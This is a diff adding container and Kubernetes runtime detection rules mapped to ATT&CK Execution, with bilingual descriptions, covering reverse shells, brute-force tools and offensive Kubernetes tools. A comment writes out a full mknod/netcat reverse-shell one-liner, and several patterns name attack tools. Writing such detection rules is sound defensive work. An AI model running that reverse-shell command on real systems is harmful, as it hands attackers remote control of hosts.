@@ -1,0 +1,584 @@
+##attck_rule_type=Execution
+# - key: DB program spawned process
+#   hid: exec_01
+#   condition: >
+#     proc.pname in (db_server_binaries)
+#     and spawned_process
+#     and shell_parent_procs
+#     and not proc.name in (db_server_binaries)
+#     and not postgres_running_wal_e
+#     and not user_known_db_spawned_processes
+#     and not tensorsec_namespace
+#   output: >
+#     proc_pid=%proc.pid,proc_ppid=%proc.ppid,proc_cmdline=%proc.cmdline,proc_pname=%proc.pname,pod_id=%k8s.pod.id,syscall_name=%syscall.type,user=%user.name,user_loginuid=%user.loginuid,parent=%proc.pname,container_id=%container.id,container_name=%container.name,image=%container.image.repository
+#   info:
+#     name:
+#       en: "DB program spawned process"
+#       zh: "数据库服务生成非自身进程"
+#     desc:
+#       en: "a database-server related program spawned a new process other than itself. This shouldn't occur and is a follow on from some SQL injection attacks."
+#       zh: "数据库服务生成非自身进程，可能存在提权行为"
+#     suggestion:
+#       en: "Please confirm whether it is the normal behavior of the process, otherwise it is recommended to check whether the database is under injection attack, there is the phenomenon of executing system commands through the database, you can use immune defense to block the further behavior of hackers."
+#       zh: "请确认是否属于进程的正常行为，否则建议排查数据库是否遭到注入攻击，存在通过数据库执行系统命令现象，可使用免疫防御阻断黑客进一步行为。"
+#     rule_type: Execution
+#     priority: ERROR
+#     urgency: true
+#     tags: [ATT&CK, process, database, mitre_execution]
+
+# - key: Run shell untrusted
+#   hid: exec_02
+#   condition: >
+#     spawned_process
+#     and shell_procs
+#     and proc.pname exists
+#     and protected_shell_spawner
+#     and not proc.pname in (shell_binaries, gitlab_binaries, cron_binaries, user_known_shell_spawn_binaries,
+#                            needrestart_binaries,
+#                            mesos_shell_binaries,
+#                            erl_child_setup, exechealthz,
+#                            PM2, PassengerWatchd, c_rehash, svlogd, logrotate, hhvm, serf,
+#                            lb-controller, nvidia-installe, runsv, statsite, erlexec, calico-node,
+#                            "puma reactor")
+#     and not proc.cmdline in (known_shell_spawn_cmdlines)
+#     and not proc.aname in (unicorn_launche)
+#     and not consul_running_net_scripts
+#     and not consul_running_alert_checks
+#     and not nginx_starting_nginx
+#     and not nginx_running_aws_s3_cp
+#     and not run_by_package_mgmt_binaries
+#     and not serf_script
+#     and not check_process_status
+#     and not run_by_foreman
+#     and not python_mesos_marathon_scripting
+#     and not splunk_running_forwarder
+#     and not postgres_running_wal_e
+#     and not redis_running_prepost_scripts
+#     and not rabbitmq_running_scripts
+#     and not rabbitmqctl_running_scripts
+#     and not run_by_appdynamics
+#     and not user_shell_container_exclusions
+#   output: >
+#     proc_pid=%proc.pid,proc_ppid=%proc.ppid,proc_cmdline=%proc.cmdline,proc_pname=%proc.pname,pod_id=%k8s.pod.id,syscall_name=%syscall.type,webshell_name=%fd.name,user=%user.name,user_loginuid=%user.loginuid,shell=%proc.name,parent=%proc.pname,gparent=%proc.aname[2],ggparent=%proc.aname[3],aname[4]=%proc.aname[4],aname[5]=%proc.aname[5],aname[6]=%proc.aname[6],aname[7]=%proc.aname[7],container_id=%container.id,container_name=%container.name,image=%container.image.repository
+#   info:
+#     name:
+#       en: "Run shell untrusted"
+#       zh: "未受信任的二进制文件产生shell"
+#     desc:
+#       en: "an attempt to spawn a shell below a non-shell application. Specific applications are monitored."
+#       zh: "未受信任的二进制文件产生shell，可能存在提权行为"
+#     suggestion:
+#       en: "Please confirm whether it is the normal behavior of the process, otherwise it is recommended to check whether the database is under injection attack, there is the phenomenon of executing system commands through the database, you can use immune defense to block the further behavior of hackers."
+#       zh: "请确认是否属于进程的正常行为，是否执行了恶意命令，确认该二进制文件是否存在安全漏洞，可使用免疫防御训练应用，阻拦新的或被修改的可执行文件，限制执行命令的用户和接收对象。"
+#     rule_type: Execution
+#     priority: WARNING
+#     urgency: true
+#     tags: [ATT&CK, shell, mitre_execution]
+
+- key: Terminal shell in container
+  hid: exec_03
+  condition: >
+    spawned_process and container
+    and shell_procs and proc.tty != 0
+    and container_entrypoint
+    and not user_expected_terminal_shell_in_container_conditions
+    and not tensorsec_namespace
+  output: >
+    proc_pid=%proc.pid,proc_ppid=%proc.ppid,proc_cmdline=%proc.cmdline,proc_pname=%proc.pname,pod_id=%k8s.pod.id,syscall_name=%syscall.type,user=%user.name,user_loginuid=%user.loginuid,container.info=%container.info,shell=%proc.name,parent=%proc.pname,terminal=%proc.tty,container_id=%container.id,container_name=%container.name,image=%container.image.repository
+  info:
+    name:
+      en: "Terminal shell in container"
+      zh: "通过entrypoint/exec的shell进入容器"
+    desc:
+      en: "Usually we think that normal users will not enter the container through the entrypoint/exec shell. It may be that the attacker uses database injection attacks to obtain database permissions and then execute system commands through the database."
+      zh: "通常我们认为正常用户不会通过entrypoint/exec的shell进入容器，可能是攻击者通过数据库注入攻击，获取数据库权限然后通过数据库执行系统命令现象。"
+    suggestion:
+      en: "Please confirm whether it is the normal behavior of the process, otherwise it is recommended to check whether the database is under injection attack, there is the phenomenon of executing system commands through the database, you can use immune defense to block the further behavior of hackers."
+      zh: "请确认是否属于进程的正常行为，否则建议排查数据库是否遭到注入攻击，存在通过数据库执行系统命令现象，可使用免疫防御阻断黑客进一步行为。"
+    rule_type: Execution
+    priority: WARNING
+    urgency: true
+    tags: [ATT&CK, container, shell, mitre_execution, L3]
+
+- key: Running k8s malicious tools in the container
+  hid: exec_04
+  condition: >
+    evt.type = execve and container and
+    shell_parent_procs and 
+    (not tensorsec_namespace) and
+    (proc.cmdline contains "cdk eva" or
+     proc.cmdline contains "k0otkit" or
+     proc.cmdline contains "kubesploit" or
+     proc.cmdline contains "red-kube" or
+     proc.cmdline contains "kubestriker" or
+     proc.cmdline contains "kube-hunter" or
+     proc.cmdline contains "kubiscan"
+      )
+  output: >
+    proc_pid=%proc.pid,proc_ppid=%proc.ppid,proc_cmdline=%proc.cmdline,proc_pname=%proc.pname,pod_id=%k8s.pod.id,syscall_name=%syscall.type,user=%user.name,user_loginuid=%user.loginuid,container.info=%container.info,shell=%proc.name,parent=%proc.pname,terminal=%proc.tty,container_id=%container.id,container_name=%container.name,image=%container.image.repository
+  info:
+    name:
+      en: "Running k8s malicious tools in the container"
+      zh: "容器内运行k8s恶意工具"
+    desc:
+      en: "We believe that there should be no such obvious malicious tools in the container. The high probability is that after the attack, the attacker runs Kubernetes (k8s) malicious tools (such as: cdk, k0otkit, etc.) in order to gain control of the cluster, destroy the cluster, and spread horizontally. , resource abuse, stealing credentials and sensitive information, deploying backdoors, etc."
+      zh: "我们认为在容器内不应当存在这类明显恶意工具，大概率是攻击者在进行攻击后，运行Kubernetes（k8s）恶意工具(如：cdk、k0otkit等)为了获取集群控制权、破坏集群、横向扩散、资源滥用、窃取凭据和敏感信息、部署后门等。"
+    suggestion:
+      en: "Please confirm whether the container has been invaded. You can use the immune defense training application to block new or modified executables, and limit the users and recipients who execute commands."
+      zh: "请确认容器是否遭到入侵，可使用免疫防御训练应用，阻拦新的或被修改的可执行文件，限制执行命令的用户和接收对象。"
+    rule_type: Execution
+    priority: WARNING
+    urgency: true
+    tags: [ATT&CK, container, k8s, mitre_execution, L4]
+
+- key: Connecting to a remote server through redis client in container
+  hid: exec_05
+  condition: >
+    evt.type = connect and container and
+    fd.sport = 6379  and
+    proc.cmdline contains "redis-cli -h " and not proc.cmdline contains "localhost" and not proc.cmdline contains "127.0.0.1" and not k8s.pod.name contains "51c1c6" and
+    shell_parent_procs
+  output: >
+    proc_pid=%proc.pid,proc_ppid=%proc.ppid,proc_cmdline=%proc.cmdline,proc_pname=%proc.pname,pod_id=%k8s.pod.id,syscall_name=%syscall.type,user=%user.name,user_loginuid=%user.loginuid,parent=%proc.pname,terminal=%proc.tty,container_id=%container.id,container_name=%container.name,image=%container.image.repository
+  info:
+    name:
+      en: "Connecting to a remote server through redis client in container"
+      zh: "容器内通过redis客户端连接远程服务器"
+    desc:
+      en: "Generally, we believe that normal users in the container will not directly manually perform remote redis connections. The high probability is that after the attack, the attacker connects to the remote server through the Redis client in the container to steal sensitive data and obtain unauthorized access. Execute malicious commands, etc."
+      zh: "通常我们认为在容器内正常用户不会直接手动执行远程redis连接，大概率是攻击者在进行攻击后，在容器内通过Redis客户端连接远程服务器的目的是窃取敏感数据、获取未授权访问权限、执行恶意命令等。"
+    suggestion:
+      en: "Please use the process tree to determine whether the command is executed by malware, confirm whether the redis connection is a normal business connection, and investigate the reason for the connection."
+      zh: "请通过进程树判断该命令是否由恶意软件执行，确认该redis连接是否为业务正常连接，排查出现该连接原因。"
+    rule_type: Execution
+    priority: WARNING
+    urgency: true
+    tags: [ATT&CK, container, exec, mitre_execution, mitre_data_leakage, mitre_lateral_movement, L4]
+
+- key: Run the tool for brute-force cracking
+  hid: exec_06
+  condition: >
+    spawned_process and proc.name in (brute_force_binaries)
+  output: >
+    proc_pid=%proc.pid,proc_ppid=%proc.ppid,proc_cmdline=%proc.cmdline,proc_pname=%proc.pname,pod_id=%k8s.pod.id,syscall_name=%syscall.type,user=%user.name,user_loginuid=%user.loginuid,container_id=%container.id,container_name=%container.name,image=%container.image.repository
+  steps:
+    - name: checkRegexMatch
+      params: [ '^(?:(?!->127\.0\.0\.1:).)*$' , trigger.payload.output_map.fd_name ]
+    - name: checkRegexMatch
+      params: [ '(((2(5[0-5]|[0-4]\d))|[0-1]?\d{1,2})(\.((2(5[0-5]|[0-4]\d))|[0-1]?\d{1,2})){3})', trigger.payload.output_map.proc_cmdline ]
+  info:
+    name:
+      en: "Run the tool for brute-force cracking"
+      zh: "运行暴力破解工具"
+    desc:
+      en: "Generally, we believe that such tools should not exist in normal containers. There is a high probability that the attacker will use brute force cracking tools (such as hydra and ncrack) to obtain unauthorized access detection of the attacked system after carrying out the attack. This may be accomplished by brute-forcing credentials for SSH, MySQL, or other services. Once the attacker has gained access, they can further probe, manipulate, or compromise the target system."
+      zh: "通常我们认为正常容器内不应存在该类工具，大概率是攻击者在进行攻击后，使用暴力破解工具(如：hydra、ncrack)获取受攻击系统的未经授权访问权限探测。这可能是通过暴力破解SSH、MySQL或其他服务的凭证来实现的，一旦攻击者获得了访问权限，他们可以进一步探测、操纵或破坏目标系统。"
+    suggestion:
+      en: "There may be brute force cracking, it is recommended to confirm whether there is a weak password in the service where the port is located."
+      zh: "可能存在暴力破解行为，建议确认端口所在服务是否存在弱口令。"
+    rule_type: Execution
+    priority: ALERT
+    urgency: true
+    tags: [ATT&CK, network, mitre_execution, L2]
+
+- key: Brute force hacking detected
+  hid: exec_07
+  condition: >
+    evt.type in (connect,sendto,sendmsg)
+    and fd.name contains "->"
+    and not fd.sport in ("", 53)
+    and fd.name != "" and fd.name exists and fd.type in ("ipv4", "ipv6")
+    and shell_family_procs
+    and not proc.name in (known_system_procs_network_activity_binaries)
+    and not proc.pname in (known_system_procs_network_activity_binaries)
+    and not (package_mgmt_procs or package_mgmt_ancestor_procs)
+    and not login_doing_dns_lookup
+    and not user_expected_system_procs_network_activity_conditions and container
+    and not tensorsec_namespace
+    and not proc.cmdline contains "redis-cli -h"
+  output: >
+    pod_id=%k8s.pod.id,syscall_name=%syscall.type,terminal=%proc.tty,user_uid=%user.uid,container_id=%container.id,container_name=%container.name,fd.num=%fd.num,fd.type=%fd.type,connection=%fd.name,client_ip=%fd.cip,client_port=%fd.cport,server_ip=%fd.sip,server_port=%fd.sport,proc_pid=%proc.pid,proc_ppid=%proc.ppid,proc_cmdline=%proc.cmdline,proc_pgid=%proc.vpgid,proc_name=%proc.name,parent=%proc.pname,proc.aname[0]=%proc.aname[0],proc.aname[1]=%proc.aname[1],gparent=%proc.aname[2],ggparent=%proc.aname[3],gggparent=%proc.aname[4]
+  steps:
+    - name: checkRegexMatch
+      params: [ '^(?:(?!->127\.0\.0\.1:).)*$' , trigger.payload.output_map.fd_name ]
+    - name: checkRegexMatch
+      params: [ '(((2(5[0-5]|[0-4]\d))|[0-1]?\d{1,2})(\.((2(5[0-5]|[0-4]\d))|[0-1]?\d{1,2})){3})', trigger.payload.output_map.proc_cmdline ]
+    - name: checkRuleRecentCount
+      params: [ 'Brute force hacking detected', 10s, 5, '["fd_sip", "fd_sport", "fd_cip"]', '[]', 1m ]
+  info:
+    name:
+      en: "Brute force hacking detected"
+      zh: "检测到正在暴力破解"
+    desc:
+      en: "We discovered this behavior by detecting high-frequency access and monitoring sensitive ports. The attacker may be using brute force cracking tools (such as hydra, ncrack) to detect unauthorized access to the attacked system. This may be accomplished by brute-forcing credentials for SSH, MySQL, or other services. Once the attacker has gained access, they can further probe, manipulate, or compromise the target system."
+      zh: "我们通过检测高频访问及对敏感端口的监控来发现此行为，攻击者可能正在使用暴力破解工具(如：hydra、ncrack)对受攻击系统进行未经授权访问权限探测。这可能是通过暴力破解SSH、MySQL或其他服务的凭证来实现的，一旦攻击者获得了访问权限，他们可以进一步探测、操纵或破坏目标系统。"
+    suggestion:
+      en: "There may be brute force cracking behavior, please determine through the process tree whether the command belongs to the normal behavior of known processes, whether it is suggested by malware execution, it is recommended to confirm whether there is a weak password for the service where the port is located and limit the number of wrong login attempts."
+      zh: "可能存在暴力破解行为，请通过进程树判断该命令是否属于已知进程的正常行为，是否由恶意软件执行建议，建议确认端口所在服务是否存在弱口令，限制错误登录尝试次数。"
+    rule_type: Execution
+    priority: ALERT
+    urgency: true
+    tags: [ATT&CK, network, mitre_execution, L2]
+
+- key: System procs network activity
+  hid: exec_08
+  condition: >
+    (fd.sockfamily = ip and system_procs)
+    and (inbound_outbound)
+    and not proc.name in (known_system_procs_network_activity_binaries)
+    and not login_doing_dns_lookup
+    and not user_expected_system_procs_network_activity_conditions
+    and container
+  output: >
+    proc_pid=%proc.pid,proc_ppid=%proc.ppid,proc_cmdline=%proc.cmdline,proc_pname=%proc.pname,pod_id=%k8s.pod.id,syscall_name=%syscall.type,user=%user.name,user_loginuid=%user.loginuid,connection=%fd.name,container_id=%container.id,container_name=%container.name,image=%container.image.repository
+  info:
+    name:
+      en: "System procs network activity"
+      zh: "系统二进制发起通信"
+    desc:
+      en: "Generally, we believe that this behavior will not be performed by normal users or business activities. The high probability is that after the attack, the attacker uses the system binary to communicate with the external server and download malicious applications, or malicious code, backdoors, etc., which are used to execute Malicious actions such as stealing sensitive information, taking control of a system, spreading additional malware, or creating persistent attacks."
+      zh: "通常我们认为正常用户或业务活动中不会执行此行为，大概率是攻击者在进行攻击后，利用系统二进制与外部服务器通信，从中下载恶意应用程序，或恶意代码、后门等，被用来执行恶意操作，如窃取敏感信息、控制系统、传播其他恶意软件，或者创建持久性攻击。"
+    suggestion:
+      en: "Please confirm whether the behavior is the normal behavior of the process and determine whether the server-side ip address is as expected, otherwise you can use the immune defense training container to prevent this type of behavior."
+      zh: "请确认该行为是否属于进程的正常行为，判断服务端ip地址是否符合预期，否则可使用免疫防御训练容器，防止该类行为。"
+    rule_type: Execution
+    priority: NOTICE
+    urgency: false
+    tags: [ATT&CK, exec, network, mitre_execution, L3]
+
+- key: Launch Remote File Copy Tools in Container
+  hid: exec_09
+  condition: >
+    spawned_process
+    and container
+    and remote_file_copy_procs
+    and not user_known_remote_file_copy_activities
+    and shell_parent_procs
+  output: >
+    proc_pid=%proc.pid,proc_ppid=%proc.ppid,proc_cmdline=%proc.cmdline,proc_pname=%proc.pname,pod_id=%k8s.pod.id,syscall_name=%syscall.type,user=%user.name,user_loginuid=%user.loginuid,parent_process=%proc.pname,container_id=%container.id,container_name=%container.name,image=%container.image.repository,image_tag=%container.image.tag
+  info:
+    name:
+      en: "Launch Remote File Copy Tools in Container"
+      zh: "容器内运行远程文件复制工具"
+    desc:
+      en: "This event is mainly triggered by the execution of some remote file copy tools in the container. We know that containers have special file copy instructions, and usually such commands are not executed in the container. Once such behavior is discovered, it is most likely because the attacker mistakenly Judgment environment, caused by operating the container as a host"
+      zh: "该事件主要是在容器内执行一些远程文件拷贝工具触发，我们知道容器有专门的文件拷贝指令，通常不会在容器内执行该类命令，一旦发现这种行为执行，大概率也是因为攻击者误判环境，将容器当做主机操作造成的"
+    suggestion:
+      en: "Please confirm whether the behavior belongs to the normal behavior of the process, judge whether the server-side ip address is as expected, and confirm whether the behavior is a trusted person and program operation; otherwise, you can use the immune defense training application to limit the abnormal behavior."
+      zh: "请确认该行为是否属于进程的正常行为，判断服务端ip地址是否符合预期，确认该行为是否为可信人员和程序操作，否则可使用免疫防御训练应用，限制异常行为。"
+    rule_type: Execution
+    priority: ALERT
+    urgency: false
+    tags: [ATT&CK, exec, network, mitre_execution, mitre_data_leakage, L4]
+
+- key: Access k8s component port
+  hid: exec_10
+  condition: >
+    easy_outbound and
+    fd.sport in (k8s_ports) and
+    shell_parent_procs
+  output: >
+    proc_pid=%proc.pid,proc_ppid=%proc.ppid,proc_cmdline=%proc.cmdline,proc_pname=%proc.pname,pod_id=%k8s.pod.id,syscall_name=%syscall.type,connection=%fd.name,client_ip=%fd.cip,client_port=%fd.cport,server_ip=%fd.sip,server_port=%fd.sport,user=%user.name,user_loginuid=%user.loginuid,container_id=%container.id,container_name=%container.name,image=%container.image.repository
+  steps:
+    - name: checkRegexMatch
+      params: [ '^(?:(?!->127\.0\.0\.1:).)*$' , trigger.payload.output_map.fd_name ]
+    - name: checkRegexMatch
+      params: [ '(((2(5[0-5]|[0-4]\d))|[0-1]?\d{1,2})(\.((2(5[0-5]|[0-4]\d))|[0-1]?\d{1,2})){3})', trigger.payload.output_map.proc_cmdline ]
+  info:
+    name:
+      en: "Access k8s component port"
+      zh: "访问k8s组件端口"
+    desc:
+      en: "Generally, we believe that normal users will not use shell (such as bash, sh) to access k8s ports. There is a high probability that attackers may take a variety of malicious activities after detecting the port information of Kubernetes components after conducting an attack. These include attempts to gain unauthorized access to components, steal sensitive information, move laterally and gain greater privileges, and tamper with or destroy configurations and resources, potentially resulting in service disruption and data corruption."
+      zh: "通常我们认为正常用户不会使用shell(如：bash、sh)的方式去访问k8s端口，大概率是攻击者在进行攻击后，探测Kubernetes组件的端口信息后可能采取多种恶意活动。包括尝试未经授权地访问组件、窃取敏感信息、横向移动并获取更大权限，以及篡改或破坏配置和资源，可能导致服务中断和数据损坏。"
+    suggestion:
+      en: "The K8S sensitive port access behavior is detected. Please confirm whether it is legal access in combination with specific commands. If not, it may be used by attackers. Please isolate the pod in time"
+      zh: "检测到k8s敏感端口访问行为,请结合具体命令确认是否为合法访问，如果不是则可能遭到攻击者利用，请及时隔离该pod。"
+    rule_type: Execution
+    priority: WARNING
+    urgency: false
+    tags: [ATT&CK, k8s, network, mitre_execution, L4]
+
+- key: Reverse shell
+  hid: exec_11
+  condition: >
+    evt.type in (connect,sendto,sendmsg)
+    and fd.name contains "->"
+    and not fd.sport in ("", 53)
+    and fd.name != "" and fd.name exists and fd.type in ("ipv4", "ipv6")
+    and shell_family_procs
+    and not proc.name in (known_system_procs_network_activity_binaries)
+    and not proc.pname in (known_system_procs_network_activity_binaries)
+    and not (package_mgmt_procs or package_mgmt_ancestor_procs)
+    and not login_doing_dns_lookup
+    and not user_expected_system_procs_network_activity_conditions and container
+    and not tensorsec_namespace
+    and not proc.cmdline contains "redis-cli -h"
+  output: >
+    pod_id=%k8s.pod.id,syscall_name=%syscall.type,terminal=%proc.tty,user_uid=%user.uid,container_id=%container.id,container_name=%container.name,fd.num=%fd.num,fd.type=%fd.type,connection=%fd.name,client_ip=%fd.cip,client_port=%fd.cport,server_ip=%fd.sip,server_port=%fd.sport,proc_pid=%proc.pid,proc_ppid=%proc.ppid,proc_cmdline=%proc.cmdline,proc_pgid=%proc.vpgid,proc_name=%proc.name,parent=%proc.pname,proc.aname[0]=%proc.aname[0],proc.aname[1]=%proc.aname[1],gparent=%proc.aname[2],ggparent=%proc.aname[3],gggparent=%proc.aname[4]
+  steps:
+    - name: checkRegexMatch
+      params: [ '^(?:(?!->127\.0\.0\.1:).)*$' , trigger.payload.output_map.fd_name ]
+    - name: checkRegexMatch
+      params: [ '(((2(5[0-5]|[0-4]\d))|[0-1]?\d{1,2})(\.((2(5[0-5]|[0-4]\d))|[0-1]?\d{1,2})){3})|(\w*sh)|(^[a-zA-Z0-9._]*$)', trigger.payload.output_map.proc_cmdline ]
+    - name: branches
+      params: MARCO::reverseShell
+  info:
+    name:
+      en: "Reverse shell through {reverse_tool: socket and dup}"
+      zh: "容器内通过{reverse_tool_zh: socket和dup}反弹shell"
+    desc:
+      en: "Rebound shell (Reverse Shell) is a computer attack technique usually used by attackers to establish a command line interface with the target computer in order to remotely control the target computer. Normal users usually do not perform this behavior. The high probability is that after the attack, the attacker uses {reverse_tool_zh: socket and dup} to rebound the shell in the container to gain control of the container. The purpose is to move laterally, steal or tamper with sensitive data. and the creation of backdoors, posing a persistent threat. These behaviors pose potential threats to the security of the container and the entire environment."
+      zh: "反弹 shell（Reverse Shell）是一种计算机攻击技术，通常由攻击者使用，目的是建立一个与目标计算机的命令行接口，以便在远程控制目标计算机。正常用户通常不会进行此行为，大概率是攻击者在进行攻击后，在容器内通过{reverse_tool_zh: socket和dup}反弹shell，获取容器内控制权，目的是横向移动、窃取或篡改敏感数据，以及建立后门，构成持久性威胁。这些行为对容器和整个环境的安全性构成潜在威胁。"
+    suggestion:
+      en: "If the container is intruded, we need to isolate the container, get the remote ip address of the attacker, and check other attacks to confirm the security of the cluster."
+      zh: "容器遭到入侵，需隔离该容器，获取攻击者远程ip地址，同时排查其他攻击行为，确认集群安全。"
+    rule_type: Execution
+    priority: ALERT
+    urgency: true
+    tags: [ATT&CK, shell, network, mitre_execution, L4]
+
+#mknod backpipe p; nc 192.168.1.167 7777 0<backpipe | /bin/bash 1>backpipe 2>backpipe
+- key: mknod rebound shell
+  hid: exec_12
+  condition: >
+    container 
+    and shell_parent_procs
+    and evt.type = execve
+    and proc.name = mknod
+    and not tensorsec_namespace 
+  output: >
+    proc_pid=%proc.pid,proc_ppid=%proc.ppid,proc_cmdline=%proc.cmdline,proc_pname=%proc.pname,pod_id=%k8s.pod.id,syscall_name=%syscall.type,user=%user.name,user_loginuid=%user.loginuid,parent=%proc.pname,file=%fd.name,program=%proc.name,gparent=%proc.aname[2],ggparent=%proc.aname[3],gggparent=%proc.aname[4],container_id=%container.id,container_name=%container.name,image=%container.image.repository
+  steps:
+    - name: checkRegexMatch
+      params: [ '^mknod .* p', trigger.payload.output_map.proc_cmdline ]
+  info:
+    name:
+      en: "Rebound shell through mknod in the container"
+      zh: "容器内通过 mknod 反弹shell"
+    desc:
+      en: "Rebound shell (Reverse Shell) is a computer attack technique usually used by attackers to establish a command line interface with the target computer in order to remotely control the target computer. Normal users usually do not perform this behavior. The high probability is that after the attack, the attacker uses mknod to rebound the shell in the container and gain control of the container. The purpose is to move laterally, steal or tamper with sensitive data, and establish a backdoor to form a persistent Sexual threats. These behaviors pose potential threats to the security of the container and the entire environment."
+      zh: "反弹 shell（Reverse Shell）是一种计算机攻击技术，通常由攻击者使用，目的是建立一个与目标计算机的命令行接口，以便在远程控制目标计算机。正常用户通常不会进行此行为，大概率是攻击者在进行攻击后，在容器内通过mknod反弹shell，获取容器内控制权，目的是横向移动、窃取或篡改敏感数据，以及建立后门，构成持久性威胁。这些行为对容器和整个环境的安全性构成潜在威胁。"
+    suggestion:
+      en: "If the container is intruded, we need to isolate the container, get the remote ip address of the attacker, and check other attacks to confirm the security of the cluster."
+      zh: "容器遭到入侵，需隔离该容器，获取攻击者远程ip地址，同时排查其他攻击行为，确认集群安全。"
+    rule_type: Execution
+    priority: ALERT
+    urgency: true
+    tags: [ATT&CK, shell, network, mitre_execution, L1]
+
+
+- key: Package management process launched in container
+  hid: exec_13
+  condition: >
+    spawned_process
+    and container
+    and user.name != "_apt"
+    and package_mgmt_procs
+    and shell_parent_procs
+    and not package_mgmt_ancestor_procs
+    and not user_known_package_manager_in_container
+    and not (tensorsec_namespace and k8s.pod.name contains "-frontend")
+  output: >
+    Pproc_pid=%proc.pid,proc_ppid=%proc.ppid,proc_cmdline=%proc.cmdline,proc_pname=%proc.pname,pod_id=%k8s.pod.id,syscall_name=%syscall.type,user=%user.name,user_loginuid=%user.loginuid,container_id=%container.id,container_name=%container.name,image=%container.image.repository,image_tag=%container.image.tag
+  info:
+    name:
+      en: "Package management process launched in container"
+      zh: "容器内启动包安装管理流程"
+    desc:
+      en: "We know that the image is usually packaged and deployed online to become a container. The environment has satisfied the normal operation of the business, and operations such as installing new applications and updating the image source will not be performed in the container. This type of operation is in the container. It usually occurs because the attacker wants to perform further operations but lacks certain tools or components to support it, so it is determined to be risky behavior."
+      zh: "我们知道，镜像通常在被打包好后部署上线成为容器，其环境已经满足业务正常运行，而不会在容器内进行诸如安装新的应用程序、更新镜像源之类的操作，该类型为在容器内发生通常是因为攻击者想要进行进一步操作但缺少某些工具或组件支持，因此判定为风险行为。"
+    suggestion:
+      en: "Please go through the process tree to determine whether the command is a normal behavior of a known process, whether it is executed by malware, and whether package management normally does not occur in the container to confirm that the process is as expected."
+      zh: "请通过进程树判断该命令是否属于已知进程的正常行为，是否由恶意软件执行，通常容器内不会出现包管理情况，确认该流程是否符合预期。"
+    rule_type: Execution
+    priority: NOTICE
+    urgency: false
+    tags: [ATT&CK, exec, container, mitre_execution, L3]
+
+- key: Update package repository
+  hid: exec_14
+  condition: >
+    ((open_write and access_repositories) or (modify and modify_repositories))
+    and shell_parent_procs
+    and not package_mgmt_procs
+    and not package_mgmt_ancestor_procs
+    and not exe_running_docker_save
+    and not user_known_update_package_registry
+    and shell_parent_procs
+  output: >
+    proc_pid=%proc.pid,proc_ppid=%proc.ppid,proc_cmdline=%proc.cmdline,proc_pname=%proc.pname,pod_id=%k8s.pod.id,syscall_name=%syscall.type,user=%user.name,user_loginuid=%user.loginuid,file=%fd.name,container_id=%container.id,container_name=%container.name,image=%container.image.repository
+  info:
+    name:
+      en: "Update package repository"
+      zh: "更新软件源"
+    desc:
+      en: "We know that the image is usually packaged and deployed online to become a container. The environment has satisfied the normal operation of the business, and operations such as installing new applications and updating the image source will not be performed in the container. This type of operation is in the container. It usually occurs because the attacker wants to perform further operations but lacks certain tools or components to support it, so it is determined to be risky behavior."
+      zh: "我们知道，镜像通常在被打包好后部署上线成为容器，其环境已经满足业务正常运行，而不会在容器内进行诸如安装新的应用程序、更新镜像源之类的操作，该类型为在容器内发生通常是因为攻击者想要进行进一步操作但缺少某些工具或组件支持，因此判定为风险行为。"
+    suggestion:
+      en: "Please go through the process tree to determine whether the command is a normal behavior of a known process, whether it is executed by malware, and whether the update operation is as expected and triggered by operation and maintenance personnel."
+      zh: "请通过进程树判断该命令是否属于已知进程的正常行为，是否由恶意软件执行，确认该更新操作是否符合预期，是否为运维人员触发。"
+    rule_type: Execution
+    priority: WARNING
+    urgency: false
+    tags: [ATT&CK, exec, filesystem, mitre_execution, L3]
+
+- key: Create files below dev
+  hid: exec_15
+  condition: >
+    fd.directory = /dev and
+    (evt.type = creat or (evt.type in (open,openat,openat2) and evt.arg.flags contains O_CREAT))
+    and not proc.name in (dev_creation_binaries)
+    and not fd.name in (allowed_dev_files)
+    and not fd.name startswith /dev/tty
+    and not user_known_create_files_below_dev_activities
+    and shell_family_procs
+  output: >
+    proc_pid=%proc.pid,proc_ppid=%proc.ppid,proc_cmdline=%proc.cmdline,proc_pname=%proc.pname,pod_id=%k8s.pod.id,syscall_name=%syscall.type,user=%user.name,user_loginuid=%user.loginuid,file=%fd.name,container_id=%container.id,container_name=%container.name,image=%container.image.repository
+  info:
+    name:
+      en: "Create files below dev"
+      zh: "在/dev目录下创建文件"
+    desc:
+      en: "The /dev directory is a special directory in Linux systems used to represent device files that are used to access and interact with system hardware devices (such as disk drives, keyboards, mice, etc.). Normally we believe that normal users will not create files in this directory. There is a high probability that the attacker will perform malicious activities after carrying out the attack, such as elevating privileges, implanting backdoors, hiding malicious files, or performing other attacks."
+      zh: "/dev目录是 Linux 系统中的一个特殊目录，用于表示设备文件，这些设备文件用于访问和与系统硬件设备（如磁盘驱动器、键盘、鼠标等）进行交互。通常我们认为正常用户不会在该目录下创建文件，大概率是攻击者在进行攻击后，为了实施恶意活动，例如提权、植入后门、隐藏恶意文件或执行其他攻击。"
+    suggestion:
+      en: "Please judge through the process tree whether the command belongs to the normal behavior of the known process, whether it is executed by malware, and confirm whether the modification is operated by the operation and maintenance personnel, otherwise it may have the risk of intrusion, and it is recommended to exclude it."
+      zh: "请通过进程树判断该命令是否属于已知进程的正常行为，是否由恶意软件执行，确认该修改是否为运维人员操作，否则可能会有入侵风险，建议排查。"
+    rule_type: Execution
+    priority: INFO
+    urgency: false
+    tags: [ATT&CK, exec, file, mitre_execution, L3]
+
+- key: Write below monitored dir
+  hid: exec_16
+  condition: >
+    evt.dir = < and open_write and monitored_dir
+    and shell_family_procs
+    and not package_mgmt_procs
+    and not coreos_write_ssh_dir
+    and not exe_running_docker_save
+    and not python_running_get_pip
+    and not python_running_ms_oms
+    and not google_accounts_daemon_writing_ssh
+    and not cloud_init_writing_ssh
+    and not user_known_write_monitored_dir_conditions
+    and not tensorsec_namespace
+  output: >
+    proc_pid=%proc.pid,proc_ppid=%proc.ppid,proc_cmdline=%proc.cmdline,proc_pname=%proc.pname,pod_id=%k8s.pod.id,syscall_name=%syscall.type,user=%user.name,user_loginuid=%user.loginuid,file=%fd.name,parent=%proc.pname,gparent=%proc.aname[2],container_id=%container.id,container_name=%container.name,image=%container.image.repository
+  info:
+    name:
+      en: "Write below monitored dir"
+      zh: "尝试修改受监控的目录下的文件"
+    desc:
+      en: "Monitored directories /boot, /lib64, /usr/lib, /root/.ssh, etc. are usually not modified directly by users. There is a high probability that attackers carry out malicious activities after carrying out attacks, including implanting backdoors, changing System configuration, hiding malicious code, tampering with sensitive data, etc."
